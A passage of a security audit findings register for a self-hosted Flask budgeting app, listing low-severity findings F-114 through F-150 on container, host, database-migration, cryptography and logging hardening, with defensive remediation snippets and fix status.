  /home/shekel/app`.
- **Impact:** Increases image size. Gives attacker who
  achieves RCE additional information about project
  structure, dev tooling, and sibling-service configuration.
- **Recommendation:** Add `.dockerignore` excluding
  non-runtime files, or use multi-stage build copying
  only `app/`, `requirements.txt`, `gunicorn.conf.py`,
  `run.py`, `entrypoint.sh`, `migrations/`.
- **Status:** Open

### F-114: User email addresses logged on every container start

- **Severity:** Low
- **OWASP:** A09:2021 Security Logging and Monitoring Failures
- **CWE:** CWE-532 (Insertion of Sensitive Information
  into Log File)
- **Source:** S2 Section 1D (`reports/08-runtime.md` F-D-13)
- **Location:** Container logs, seed/migration phase
- **Description:** Every container start logs user email
  addresses during seed/migration:
  `User 'josh@REDACTED' already exists (id=1). Skipping.`
  `Seeding tax data for user: josh@REDACTED (id=1)`. PII
  persists in Docker logs.
- **Evidence:** `scans/container-logs.txt` lines 24, 43.
- **Impact:** PII in Docker logs (possibly forwarded to
  external log sinks if F-082 is implemented). Low
  direct risk for single-user app; becomes relevant for
  public deployment.
- **Recommendation:** Redact email addresses in seed
  script output (log user_id + role, not email). Suppress
  "already exists" messages after initial setup.
- **Status:** Fixed in C-16 (5ed0334, 2026-05-06).
  `scripts/seed_user.py` and `scripts/seed_tax_brackets.py` now
  redact email addresses from log output (logging user_id + role
  only) and suppress benign "already exists" lines. Companion
  `SensitiveFieldScrubber` log filter at
  `app/utils/logging_config.py:297` defends downstream sinks if
  PII is ever introduced to the logger again.

### F-115: No resource limits on any container

- **Severity:** Low
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-770
- **Source:** S2 Section 1D (`reports/08-runtime.md` F-D-09)
- **Location:** `docker-compose.yml`
- **Description:** No memory, PID, or CPU limits on any
  container. A runaway process or fork-bomb could consume
  all host resources and affect every other service on the
  host.
- **Evidence:** `Memory: 0, PidsLimit: null` in all three
  `*-hostconfig.json` files.
- **Impact:** DoS against the host and co-located services
  (immich, jellyfin, unifi).
- **Recommendation:** Add `mem_limit: 512m` for app,
  `mem_limit: 256m` for db, `pids_limit: 200` to each
  service in `docker-compose.yml`. Tune based on observed
  usage.
- **Status:** Open

### F-116: No Docker log rotation configured

- **Severity:** Low
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-400 (Uncontrolled Resource Consumption)
- **Source:** S2 Section 1D (`reports/08-runtime.md` F-D-10)
- **Location:** `docker-compose.yml`
- **Description:** Docker's json-file log driver is used
  with no `max-size` or `max-file` options. Container logs
  grow unbounded. Combined with F-054 (stale `shekel-app`
  restarts every ~30s for 22+ hours) and F-114 (user
  emails in every log), the `/var/lib/docker` partition
  fills over time.
- **Evidence:** `LogConfig: {"Type": "json-file",
  "Config": {}}`.
- **Impact:** Disk-exhaustion DoS on the host.
- **Recommendation:** Add per service:
  ```yaml
  logging:
    driver: json-file
    options:
      max-size: "10m"
      max-file: "3"
  ```
- **Status:** Open

### F-117: Container root filesystem is writable

- **Severity:** Low
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-732
- **Source:** S2 Section 1D (`reports/08-runtime.md` F-D-11)
- **Location:** `docker-compose.yml` app service
- **Description:** The app container's root filesystem is
  writable (`ReadonlyRootfs: false`). An attacker who
  achieves RCE can modify application files.
- **Evidence:** `scans/container-hostconfig.json`.
- **Impact:** Low because the container is ephemeral
  (rebuilt on deploy), but a read-only rootfs with
  writable tmpfs for `/tmp` reduces the window for
  persistence.
- **Recommendation:** Add to the app service:
  ```yaml
  read_only: true
  tmpfs:
    - /tmp
  ```
- **Status:** Open

### F-118: psycopg2 LGPL license

- **Severity:** Low
- **OWASP:** N/A (license compliance)
- **CWE:** N/A
- **Source:** S2 Section 1E (`reports/09-supply-chain.md`
  F-E-03)
- **Location:** `requirements.txt` (`psycopg2==2.9.11`)
- **Description:** Licensed under "LGPL with exceptions."
  Using psycopg2 as a library does not trigger copyleft;
  only modifying its source would. Compatible with
  Shekel's current private use and any plausible future
  open-source license.
- **Evidence:** psycopg2 PyPI metadata.
- **Impact:** None for current deployment. If the project
  is open-sourced under a non-GPL license, the exception
  must be documented.
- **Recommendation:** Document LGPL exception in a
  `THIRD-PARTY-LICENSES.md`. Consider migrating to
  psycopg3 (BSD, actively maintained, async support) in a
  future cycle.
- **Status:** Open

### F-119: Flask-SQLAlchemy stale (31 months) but organizationally backed

- **Severity:** Low
- **OWASP:** A06:2021 Vulnerable and Outdated Components
- **CWE:** CWE-1104
- **ASVS:** V14.2.2
- **Source:** S2 Section 1E (`reports/09-supply-chain.md`
  F-E-04)
- **Location:** `requirements.txt` (`Flask-SQLAlchemy==3.1.1`)
- **Description:** Last release 2023-09-11 (31 months).
  Maintained by the Pallets organization. Thin integration
  layer; security-relevant logic is in SQLAlchemy itself
  (2.0.49, actively maintained).
- **Evidence:** PyPI metadata.
- **Impact:** Lower risk than F-058/F-059. Pallets
  backing reduces abandonment risk.
- **Recommendation:** Monitor. Lower priority than F-058,
  F-059.
- **Status:** Open

### F-120: pip CVE in container (build-time only)

- **Severity:** Low
- **OWASP:** A06:2021 Vulnerable and Outdated Components
- **CWE:** CWE-22 (Path Traversal)
- **Source:** S2 Section 1G (`reports/11-container-image.md`
  F-G-03)
- **Location:** pip 25.3 at `/opt/venv/lib/python3.14/
  site-packages/pip-25.3.dist-info/`
- **Description:** CVE-2026-1703 -- info disclosure via
  path traversal when installing crafted wheels. Fixed in
  pip 26.0. pip is only used at image build time, not at
  runtime.
- **Evidence:** `scans/trivy-image.json` CVE entry.
- **Impact:** Very low. Requires a malicious wheel;
  Shekel installs only from pinned `requirements.txt`.
- **Recommendation:** Add `pip install --upgrade pip` to
  the Dockerfile before `pip install -r requirements.txt`.
- **Status:** Open

### F-121: GRUB bootloader not password-protected

- **Severity:** Low
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-306
- **Source:** S2 Section 1H (`reports/12-host-hardening.md`
  F-H-08); Lynis BOOT-5122
- **Location:** Host GRUB config
- **Description:** GRUB has no password. Anyone with
  physical access can edit boot parameters (boot into
  single-user mode without a password, for instance).
- **Evidence:** Lynis output.
- **Impact:** Low for a server under physical control.
  Higher if the machine is in shared physical space.
- **Recommendation:** Set a GRUB password if physical
  access is not fully controlled.
- **Status:** Open

### F-122: Core dumps not disabled

- **Severity:** Low
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-532
- **Source:** S2 Section 1H (`reports/12-host-hardening.md`
  F-H-09); Lynis KRNL-5820
- **Location:** `/etc/security/limits.conf` and sysctl
- **Description:** Core dumps not explicitly disabled. A
  crashing Python process could write a core containing
  `TOTP_ENCRYPTION_KEY`, session cookies, DB credentials
  from memory.
- **Evidence:** Lynis output.
- **Impact:** If a crash produces a core dump readable
  by another user, in-memory secrets leak.
- **Recommendation:** Add `* hard core 0` to
  `/etc/security/limits.conf`; add `fs.suid_dumpable = 0`
  to `/etc/sysctl.d/99-hardening.conf`.
- **Status:** Open

### F-123: No file integrity monitoring on host

- **Severity:** Low
- **OWASP:** A09:2021 Security Logging and Monitoring Failures
- **CWE:** CWE-354
- **Source:** S2 Section 1H (`reports/12-host-hardening.md`
  F-H-10); Lynis FINT-4350
- **Location:** Host
- **Description:** No AIDE, OSSEC, Tripwire, or Wazuh
  installed. No baseline for detecting unauthorized
  changes to system files or application binaries.
- **Evidence:** Lynis output.
- **Impact:** Tampering with binaries or configs goes
  undetected.
- **Recommendation:** Install AIDE with baseline for
  `/usr/bin`, `/etc`, `/opt/docker`, and the Shekel
  repository path.
- **Status:** Open

### F-124: No NTP synchronization detected on host

- **Severity:** Low
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-16
- **Source:** S2 Section 1H (`reports/12-host-hardening.md`
  F-H-11); Lynis TIME-3104
- **Location:** Host systemd-timesyncd / chrony / ntpd
- **Description:** No NTP daemon detected. Accurate time
  matters for log correlation, TOTP validity (clock skew
  rejects valid codes or accepts expired ones), TLS cert
  validation.
- **Evidence:** Lynis output.
- **Impact:** Clock drift over time causes TOTP
  rejection, invalid cert warnings, and log-correlation
  difficulty.
- **Recommendation:** Enable `systemd-timesyncd`
  (`systemctl enable --now systemd-timesyncd`) or install
  chrony.
- **Status:** Open

### F-125: No PAM password strength module on host

- **Severity:** Low
- **OWASP:** A07:2021 Identification and Authentication Failures
- **CWE:** CWE-521
- **Source:** S2 Section 1H (`reports/12-host-hardening.md`
  F-H-12); Lynis AUTH-9262
- **Location:** Host PAM config
- **Description:** No pam_cracklib / pam_passwdqc. The
  host user (`josh`) can have a weak password.
- **Evidence:** Lynis output.
- **Impact:** If SSH password auth is enabled (see F-066)
  and the host user has a weak password, the host is
  brute-forceable.
- **Recommendation:** Install `pam_passwdqc` for enforced
  password complexity on the host user account.
  Supersedes F-066 benefit if key-only SSH is implemented.
- **Status:** Open

### F-126: Leap-year interest projection uses 365-day convention

- **Severity:** Low
- **OWASP:** N/A (financial precision)
- **CWE:** CWE-1339
- **Source:** S5 (`reports/16-business-logic.md` L-P1)
- **Location:** `app/services/interest_projection.py:15`
- **Description:** US bank convention: actual/365 day
  count. In leap years (2024, 2028), uses 365 instead of
  366 days; overstates daily interest by ~0.27%.
  Documented in code as an accepted simplification.
- **Evidence:** Code comment at `interest_projection.py:15`.
- **Impact:** For $100K at 4.5% APY in a leap year,
  projected annual interest overstated by ~$1.23.
  Shekel users typically have thousands, not hundreds of
  thousands -- impact under $0.10/year.
- **Recommendation:** Documented as acceptable
  simplification; no change needed. Info-level but filed
  for completeness.
- **Status:** Open

### F-127: Biweekly-paycheck rounding residue

- **Severity:** Low
- **OWASP:** N/A (financial precision)
- **CWE:** CWE-1339
- **Source:** S5 (`reports/16-business-logic.md` L-P2)
- **Location:** `app/services/paycheck_calculator.py:91-93`
- **Description:** $50,000 / 26 = $1923.0769...;
  quantize to $1923.08 per paycheck; 26 × $1923.08 =
  $49,999.92. $0.08 rounding residue is missing from the
  annual aggregate. Matches real-world payroll behavior.
- **Evidence:** Code arithmetic.
- **Impact:** Projected annual income may differ from
  `annual_salary` by up to ~$0.13.
- **Recommendation:** Expected behavior; note in
  docstring.
- **Status:** Open

### F-128: Cloudflared metrics endpoint reachable from homelab

- **Severity:** Low
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-200 (Exposure of Sensitive Information)
- **Source:** S3 Section 1I (`reports/13-attack-surface.md`
  Section 6 finding #7)
- **Location:** `cloudflared` container command-line
  flag `--metrics 0.0.0.0:2000`
- **Description:** Cloudflared metrics endpoint binds on
  `0.0.0.0:2000` inside the container, making it reachable
  from every other homelab peer including shekel-prod-app.
  An attacker with code execution inside the app can poll
  cloudflared metrics (tunnel health, request counts), which
  may leak operational data.
- **Evidence:** `scans/cloudflared-ingress.txt` and
  `scans/homelab-compose.txt`.
- **Impact:** Low. Operational data leak but no direct
  credential exposure.
- **Recommendation:** Change to `--metrics 127.0.0.1:2000`
  so the endpoint is only locally reachable from inside the
  cloudflared container itself.
- **Status:** Open

### F-129: UniFi + shared nginx vhosts expand cross-service lateral movement

- **Severity:** Low
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-653
- **Source:** S3 Section 1I (`reports/13-attack-surface.md`
  Section 6 finding #8)
- **Location:** homelab network co-tenants
- **Description:** If jellyfin, immich, or unifi is
  compromised via a CVE, the attacker lands on homelab
  (172.18.0.0/16) and is one Flask-auth-bypass away from
  Shekel. Same root cause as F-020 but from the other
  direction (inbound from compromised neighbor, not
  outbound from Shekel).
- **Evidence:** Network membership analysis in S3.
- **Impact:** Shekel's blast radius expands to equal
  the worst CVE on any co-tenant. Jellyfin's media-parsing
  code is a historical CVE hotspot.
- **Recommendation:** Same as F-020: isolate Shekel's
  proxy path onto its own docker network.
- **Status:** Open

### F-130: SSH config not verified during audit window

- **Severity:** Low (deferral)
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-16
- **Source:** S3 Section 1I (`reports/13-attack-surface.md`
  Section 6 finding #9); F-066 addresses the concrete
  hardening items
- **Location:** `/etc/ssh/sshd_config`
- **Description:** S3 did not read the live sshd config.
  Lynis (S2 Section 1H) reported some SSH hardening items
  (see F-066) but did not verify `PermitRootLogin`,
  `PasswordAuthentication`, or fail2ban presence.
- **Evidence:** None directly; deferral.
- **Impact:** SSH posture is unknown. Since SSH is the
  highest-blast-radius entry on the LAN (F-066), unknown
  posture = latent risk.
- **Recommendation:** Verify
  `PubkeyAuthentication yes`, `PasswordAuthentication no`,
  `PermitRootLogin no`, `AllowUsers josh`, fail2ban
  installed and active. Document the check in
  `docs/audits/security-2026-04-15/scans/sshd_config.txt`.
- **Status:** Open

### F-131: Migration #22 downgrade uses `pass` instead of NotImplementedError

- **Severity:** Low
- **OWASP:** A08:2021 Software and Data Integrity Failures
- **CWE:** CWE-1188
- **Source:** S6 (`reports/17-migrations-schema.md`
  F-S6-C1-08)
- **Location:** `migrations/versions/b4c5d6e7f8a9_*.py`
- **Description:** Uses bare `pass` in downgrade with an
  inline comment justifying it ("No safe automatic
  downgrade"). Workflow rule: bare `pass` is a FAIL; the
  migration should `raise NotImplementedError` with
  instructions for manual recovery.
- **Evidence:** Read of the migration file.
- **Impact:** Policy violation. Intent is correct (data-
  correction migration, not automatically reversible) but
  form violates the standard.
- **Recommendation:** Change `pass` to:
  ```python
  raise NotImplementedError(
      "This is a data-correction migration. To revert, "
      "manually UPDATE salary.salary_raises SET "
      "effective_year = NULL WHERE is_recurring = TRUE "
      "AND created_at.year = extracted year."
  )
  ```
- **Status:** Open

### F-132: Missing review documentation on destructive migrations

- **Severity:** Low
- **OWASP:** N/A (process)
- **CWE:** CWE-1053
- **Source:** S6 (`reports/17-migrations-schema.md`
  F-S6-C2-01)
- **Location:** All destructive migrations (the ones
  tagged D-01 through D-06 in report 17)
- **Description:** No migration includes a `review_by:` or
  `approved_by:` line. Coding standards require destructive
  migrations (drops, renames, type changes) to have
  explicit approval documentation.
- **Evidence:** S6 file scan.
- **Impact:** Audit cannot verify destructive operations
  were reviewed before application. Accountability record
  missing.
- **Recommendation:** Establish a migration docstring
  convention recording review scope and date. Add to
  migration template. Retroactive backfill optional.
- **Status:** Open

### F-133: Downgrade fails on state_tax_configs constraint re-creation

- **Severity:** Low
- **OWASP:** A08:2021 Software and Data Integrity Failures
- **CWE:** CWE-1188
- **Source:** S6 (`reports/17-migrations-schema.md`
  F-S6-C1-07)
- **Location:** `migrations/versions/7abcbf372fff_*.py`
- **Description:** Replaces 2-col unique `(user_id,
  state_code)` with 3-col `(user_id, state_code,
  tax_year)`. Downgrade recreates the narrower constraint
  without checking for duplicate `(user_id, state_code)`
  pairs. If a user has multiple state_tax_configs for the
  same state in different tax_years (allowed post-
  migration), downgrade fails with unique violation.
- **Evidence:** Read of downgrade method.
- **Impact:** Emergency rollback is impossible if data
  has grown to violate the narrower constraint.
- **Recommendation:** Document the incompatibility in the
  migration. Change the downgrade to `raise
  NotImplementedError("Downgrade impossible if any user has
  multiple state_tax_configs for the same state. Resolve
  manually first.")`.
- **Status:** Open

### F-134: Server_default removal (undocumented) on several columns

- **Severity:** Low
- **OWASP:** A08:2021 Software and Data Integrity Failures
- **CWE:** CWE-1188
- **Source:** S6 (`reports/17-migrations-schema.md`
  F-S6-C3-05)
- **Location:** Columns in `salary.fica_configs`,
  `salary.pension_profiles`, `salary.salary_profiles`,
  `budget.investment_params`, `budget.transfers`
- **Description:** Several columns declared with
  `server_default=...` in migrations show no default in
  live DB `\d+` output. May be a `pg_attrdef` display
  artifact OR the defaults were silently stripped.
- **Evidence:** S6 live-DB inspection.
- **Impact:** Raw INSERTs without explicit column values
  could hit NOT NULL violations instead of receiving
  sensible defaults. Low unless the app relies on them.
- **Recommendation:** Query `pg_attrdef` directly to
  confirm whether defaults truly exist. If not, issue a
  migration to restore them. See also F-068.
- **Status:** Fixed in C-25 (e2b3de9, 2026-05-07).
  Live `pg_attrdef` was inspected; the affected columns were
  already NOT NULL. The C-25 sweep restores `server_default`
  on the model declarations and Alembic migration so future
  raw INSERTs without explicit column values pick up the
  documented defaults instead of relying on the live-DB
  artefact.

### F-135: Boundary inclusivity mismatches (schema >=0 vs DB >0 or vice versa)

- **Severity:** Low
- **OWASP:** A03:2021 Input Validation
- **CWE:** CWE-20
- **Source:** S6 (`reports/17-migrations-schema.md`
  F-S6-C4-07)
- **Location:** `loan_params.original_principal` (covered
  in F-107), `savings_goals.contribution_per_period`
  (covered in F-106), `paycheck_deductions.annual_cap`,
  `transaction_entries.amount`
- **Description:** Several columns where Marshmallow
  boundary is inclusive (>=0) and DB is exclusive (>0) or
  vice versa. Users entering 0 get either 400 or 500
  depending on which layer catches it first.
- **Evidence:** S6 cross-reference tables.
- **Impact:** Inconsistent error behavior for boundary
  values. Low severity but poor UX.
- **Recommendation:** Align both sides to the intended
  semantic. Usually monetary amounts should be `> 0`
  and counts should be `>= 0`. Add boundary tests.
- **Status:** Fixed in C-25 (e2b3de9, 2026-05-07).
  Schema and DB are now aligned for the F-106/F-107 monetary
  columns and for the broader strictly-positive monetary set
  flagged in this rollup. Boundary tests assert that zero is
  rejected with a clean field-level 400 (not an
  IntegrityError) for every monetary column with a `> 0`
  CHECK.

### F-136: Inconsistent inter-budget pay_period_id ondelete policies

- **Severity:** Low
- **OWASP:** A04:2021 Insecure Design
- **CWE:** CWE-1188
- **Source:** S6 (`reports/17-migrations-schema.md`
  F-S6-C5-03)
- **Location:** `budget.transactions.pay_period_id` vs
  `budget.transfers.pay_period_id`
- **Description:** `transactions.pay_period_id` is
  CASCADE (delete period → delete transactions) while
  `transfers.pay_period_id` is RESTRICT (delete period →
  refuse). Different behavior depending on whether a user
  has transactions or transfers in a period.
- **Evidence:** Live DB `\d+` output.
- **Impact:** Low. Asymmetry is unexpected but not
  dangerous. May be intentional or accidental drift.
- **Recommendation:** Investigate whether asymmetry is
  intentional. If accidental, standardize to CASCADE for
  consistency.
- **Status:** Open

### F-137: Self-referential FK naming convention violation

- **Severity:** Low
- **OWASP:** N/A (code quality)
- **CWE:** CWE-1078
- **Source:** S6 (`reports/17-migrations-schema.md`
  F-S6-C5-04)
- **Location:** `budget.transactions.credit_payback_for_id`,
  `budget.scenarios.cloned_from_id`
- **Description:** Both self-references use `SET NULL`
  (correct semantics) but FK names
  (`transactions_credit_payback_for_id_fkey`,
  `scenarios_cloned_from_id_fkey`) don't follow the
  `fk_*` convention.
- **Evidence:** S6 constraint listing.
- **Impact:** Same as F-078. Naming consistency only.
- **Recommendation:** Rename in next migration that
  touches these tables.
- **Status:** Open

### F-138: Orphan FK name after hysa_params → interest_params rename

- **Severity:** Low
- **OWASP:** N/A (code quality)
- **CWE:** CWE-1078
- **Source:** S6 (`reports/17-migrations-schema.md`
  F-S6-C5-05); see also F-072
- **Location:** `budget.interest_params` FK constraint
  named `hysa_params_account_id_fkey`
- **Description:** From F-072; FK still reflects pre-
  rename name. Tracked separately because it requires a
  distinct ALTER CONSTRAINT statement.
- **Evidence:** Live DB listing.
- **Impact:** Same as F-072/F-078.
- **Recommendation:** Include in F-072's follow-up
  migration.
- **Status:** Open

### F-139: Missing index on rate_history.account_id

- **Severity:** Low
- **OWASP:** A04:2021 Insecure Design
- **CWE:** CWE-1078
- **Source:** S6 (`reports/17-migrations-schema.md`
  F-S6-C6-02)
- **Location:** `budget.rate_history.account_id`
- **Description:** No index on `account_id` despite being
  the primary query column for every amortization
  projection against a variable-rate loan. Violates
  "every frequent WHERE/JOIN column should have an
  index" from coding standards.
- **Evidence:** Live DB listing.
- **Impact:** Low today (small table); becomes bottleneck
  as loan-tracking data grows.
- **Recommendation:** `CREATE INDEX idx_rate_history_account
  ON budget.rate_history (account_id, effective_date DESC);`.
- **Status:** Open

### F-140: Missing FK indexes on salary schema (pension/calibration)

- **Severity:** Low
- **OWASP:** A04:2021 Insecure Design
- **CWE:** CWE-1078
- **Source:** S6 (`reports/17-migrations-schema.md`
  F-S6-C6-03)
- **Location:** `salary.pension_profiles(user_id,
  salary_profile_id)`,
  `salary.calibration_deduction_overrides(deduction_id)`
- **Description:** FK columns used in frequent WHERE/JOIN
  but no indexes.
- **Evidence:** Live DB listing.
- **Impact:** Performance regression as data grows.
- **Recommendation:** Add indexes for each listed FK
  column.
- **Status:** Open

### F-141: No additional KDF pepper on bcrypt

- **Severity:** Low
- **OWASP:** A02:2021 Cryptographic Failures
- **CWE:** CWE-326
- **ASVS:** V2.4.5
- **Source:** S7 (`reports/18-asvs-l2.md` V2.4.5)
- **Location:** `app/services/auth_service.py:254-273`
  (hash_password)
- **Description:** Shekel stores raw bcrypt hashes. ASVS
  L2 recommends wrapping the hash in HMAC-SHA256 with a
  server-side pepper key, so offline brute-force requires
  both the DB dump AND the pepper key.
- **Evidence:** Read of hash_password.
- **Impact:** Weaker resistance to offline attack if
  bcrypt hashes leak. F-088 (move to Argon2id) provides
  a more comprehensive fix.
- **Recommendation:** Either (a) migrate to Argon2id and
  skip the pepper, or (b) add HMAC-SHA256 wrapper with a
  pepper key in the environment. Requires password
  migration strategy (re-hash on next login).
- **Status:** Open

### F-142: TOTP reuse logging + user notification missing

- **Severity:** Low
- **OWASP:** A09:2021 Security Logging and Monitoring Failures
- **CWE:** CWE-778
- **ASVS:** V2.8.5
- **Source:** S7 (`reports/18-asvs-l2.md` V2.8.5); downstream
  of F-005
- **Location:** `app/services/mfa_service.py:96-109` (verify
  path)
- **Description:** Downstream consequence of F-005. No
  detection of replay, no logging event, no user
  notification. If F-005 is fixed (last-timestep tracking),
  the detection hook has a natural place to emit a
  structured `totp_replay_rejected` event.
- **Evidence:** Grep of `app/` for `totp_replay` returns
  zero hits.
- **Impact:** Replay attacks go undetected even after
  F-005 fix unless logging is added at the same time.
- **Recommendation:** Fix alongside F-005. When the
  last-timestep check rejects a code, emit
  `log_event(logger, WARNING, "totp_replay_rejected",
  AUTH, user_id=user.id)`.
- **Status:** Fixed in C-09 (e7e0bae, 2026-05-04).
  `app/utils/log_events.py:201` registers
  `EVT_TOTP_REPLAY_REJECTED` and `app/routes/auth.py:179` emits
  it whenever the last-timestep check rejects a code (and
  `:1210` for the disable path). Closed in the same commit as
  F-005.

### F-143: View active sessions UI missing

- **Severity:** Low
- **OWASP:** A07:2021 Identification and Authentication Failures
- **CWE:** CWE-613
- **ASVS:** V3.3.4
- **Source:** S7 (`reports/18-asvs-l2.md` V3.3.4)
- **Location:** `app/routes/auth.py:231-247`
  (/invalidate-sessions),
  `app/templates/settings/_security.html:31-40`
- **Description:** `/invalidate-sessions` provides
  blanket "log out all other sessions" but no list of
  active sessions. Users cannot see IP/device/creation-
  time or revoke specific sessions.
- **Evidence:** Template + route read.
- **Impact:** Users cannot audit who is logged in to
  their account or selectively revoke access.
- **Recommendation:** Build session-list UI showing
  IP, device, creation timestamp, and revoke button.
  Requires server-side session store (Flask's signed
  cookies are stateless). Medium effort.
- **Status:** Open

### F-144: Access-control failures not logged as distinct events

- **Severity:** Low
- **OWASP:** A09:2021 Security Logging and Monitoring Failures
- **CWE:** CWE-778
- **ASVS:** V7.1.3, V7.2.2
- **Source:** S7 (`reports/18-asvs-l2.md` V7.1.3 + V7.2.2)
- **Location:** `app/utils/auth_helpers.py:29-55, :58-124`
  (`require_owner`, `get_or_404`)
- **Description:** Auth events comprehensively logged
  (login, logout, password change, MFA enable/disable,
  session invalidation), but access-control failures are
  not emitted as distinct events. Generic 404 log entry
  does not distinguish "route not found" from "cross-
  user access attempt."
- **Evidence:** `auth_helpers.py` returns 404 on
  ownership mismatch; no `log_event(..., "access_denied",
  ...)` call.
- **Impact:** Auditors cannot query "all access-denied
  events for user X." Cross-user probing is invisible.
- **Recommendation:** Add `log_event(logger, WARNING,
  "access_denied", AUTH, user_id=current_user.id,
  resource_type=..., resource_id=...)` inside
  `require_owner` and `get_or_404` when ownership
  fails.
- **Status:** Fixed in C-14 (d56458a, 2026-05-05).
  `app/utils/log_events.py:227-232` registers
  `EVT_ACCESS_DENIED_OWNER_ONLY` (role mismatch) and
  `EVT_ACCESS_DENIED_CROSS_USER` (ownership mismatch);
  `require_owner` and `get_or_404` in
  `app/utils/auth_helpers.py` emit the appropriate event before
  returning 404. "Access denied for user X" is now queryable.

### F-145: Fourteen broad `except Exception:` blocks in routes

- **Severity:** Low
- **OWASP:** A09:2021 Security Logging and Monitoring Failures
- **CWE:** CWE-396 (Declaration of Catch for Generic Exception)
- **ASVS:** V7.4.2
- **Source:** S1 Subagent B1 (`reports/02a-routes.md`
  F-B1-11 + F-B1-12 + F-B1-13); S7 (`reports/18-asvs-l2.md`
  V7.4.2); bandit B110-1, B110-2
- **Location:** `app/routes/salary.py:249, :326, :390,
  :420, :470, :521, :551, :604, :836, :875, :1041`,
  `app/routes/retirement.py:292-297`,
  `app/routes/investment.py:813`, `app/routes/health.py:37-48`
- **Description:** Fourteen broad `except Exception:`
  blocks in route handlers. Project coding standards
  forbid broad exception catches. Each swallows errors
  that should surface as 500s or distinct 400 validation
  errors.
- **Evidence:** Grep of `app/routes/` for
  `except Exception:` returns 14 matches across 4 files.
- **Impact:** Errors that should produce actionable
  messages (or fail-loud 500s) are silently caught and
  turned into generic "Failed to save" flashes. F-011,
  F-012, F-074, F-075 all rely on users NOT seeing the
  underlying DB CHECK violation.
- **Recommendation:** Narrow every block to specific
  exception types (`IntegrityError`, `SQLAlchemyError`,
  `InvalidOperation`, whatever the `try` block actually
  raises). Health-check broad-except (F-B1-11) is an
  acceptable exception with an explicit pylint disable.
- **Status:** Open

### F-146: No abnormal-request-volume detection or alerting

- **Severity:** Low
- **OWASP:** A09:2021 Security Logging and Monitoring Failures
- **CWE:** CWE-778
- **ASVS:** V8.1.4
- **Source:** S7 (`reports/18-asvs-l2.md` V8.1.4)
- **Location:** Feature-level absence
- **Description:** Flask-Limiter enforces hard limits but
  never alerts. No webhook, email, Slack, dashboard, or
  per-user daily threshold. A slow credential-stuffing
  campaign staying under the rate limit proceeds
  indefinitely with no operator notice.
- **Evidence:** No alerting code anywhere in `app/`.
- **Impact:** Sustained attack campaigns go unnoticed.
  Rate limits prevent the attack from succeeding quickly
  but provide no signal for operator response.
- **Recommendation:** Ship rate-limit-hit events
  (429 responses) to an alerting channel. Add per-user
  daily failed-login thresholds. Integrates naturally
  with F-082 (off-host log shipping).
- **Status:** Fixed in C-15 (f1fc08a, 2026-05-05).
  `app/utils/log_events.py:239` registers
  `EVT_RATE_LIMIT_EXCEEDED` under ACCESS, and
  `app/__init__.py:579` emits it whenever the limiter rejects
  a request. The off-host pipeline shipped in the same commit
  forwards 429 events to Loki; alerting hooks fire on the
  abnormal-volume signal.

### F-147: PII and financial data not encrypted at rest

- **Severity:** Low (Accept for LAN-only; Medium+ for public)
- **OWASP:** A02:2021 Cryptographic Failures
- **CWE:** CWE-311 (Missing Encryption of Sensitive Data)
- **ASVS:** V6.1.1, V6.1.3
- **Source:** S7 (`reports/18-asvs-l2.md` V6.1.1 + V6.1.3)
- **Location:** `auth.users.email`, `auth.users.display_name`,
  `budget.accounts.current_anchor_balance`,
  `budget.transactions.*amount*`, etc.
- **Description:** Email, display_name, account balances,
  transaction amounts, salary amounts, and category names
  stored as plaintext. No pgcrypto or application-level
  encryption. S6 schema review confirmed zero pgcrypto
  columns.
- **Evidence:** Live DB `\d+` output.
- **Impact:** Disk breach exposes full financial history
  and PII in plaintext.
- **Recommendation:** Accepted for current LAN-only
  deployment. For public deployment, add field-level
  encryption on sensitive columns OR document LUKS
  requirement at the host level. Field-level encryption
  breaks query aggregation; plan accordingly.
- **Status:** Open

### F-148: No secrets-management solution

- **Severity:** Low (Accept for single-operator LAN)
- **OWASP:** A02:2021 Cryptographic Failures
- **CWE:** CWE-522
- **ASVS:** V6.4.1
- **Source:** S7 (`reports/18-asvs-l2.md` V6.4.1)
- **Location:** `docker-compose.yml:59, :66, :72`
- **Description:** No Vault, AWS Secrets Manager, or
  similar. Secrets loaded from `.env` files on the Docker
  host.
- **Evidence:** Compose file read.
- **Impact:** No managed secret lifecycle (rotation,
  audit, destruction). Manual rotation only.
- **Recommendation:** Accept for single-operator LAN.
  For multi-host / public deployment, migrate to Docker
  secrets (Swarm) or a managed solution.
- **Status:** Open

### F-149: Key material exposed in process memory

- **Severity:** Low (Accept -- no HSM/PKCS#11 available)
- **OWASP:** A02:2021 Cryptographic Failures
- **CWE:** CWE-316
- **ASVS:** V6.4.2
- **Source:** S7 (`reports/18-asvs-l2.md` V6.4.2)
- **Location:** `app/config.py:22, :25`;
  `app/services/mfa_service.py:27`
- **Description:** `SECRET_KEY` and `TOTP_ENCRYPTION_KEY`
  loaded into Python memory via `os.getenv`. Any process
  with `/proc/<pid>/environ` access or gdb can extract.
- **Evidence:** Standard Flask pattern.
- **Impact:** Process-memory breach exposes keys.
- **Recommendation:** Accept. No practical mitigation
  without HSM/PKCS#11. F-055 + F-023 narrow attack surface.
- **Status:** Open

### F-150: Application logs not protected from tampering

- **Severity:** Low
- **OWASP:** A09:2021 Security Logging and Monitoring Failures
- **CWE:** CWE-778
- **ASVS:** V7.3.3
- **Source:** S7 (`reports/18-asvs-l2.md` V7.3.3);
  superset in F-082
- **Location:** `applogs` Docker volume at
  `docker-compose.yml:78`
- **Description:** Log file in a Docker volume owned by
  the container's non-root user. No append-only flag, no
  signing, no off-host shipping. Privileged attacker can
  redact.
- **Evidence:** Volume config.
- **Impact:** Same threat model as F-082 at smaller scope.
- **Recommendation:** Ship logs to Loki/syslog/S3 for
  tamper-evidence. Same remediation as F-082.
- **Status:** Fixed in C-15 (f1fc08a, 2026-05-05). Closed in the
  same commit as F-082: `monitoring/promtail-config.yml` ships the
  `applogs` volume contents to off-host Loki on a separate
  network. The volume is no longer the authoritative store; an
  attacker who pivots into the app container cannot redact what
  has already shipped.

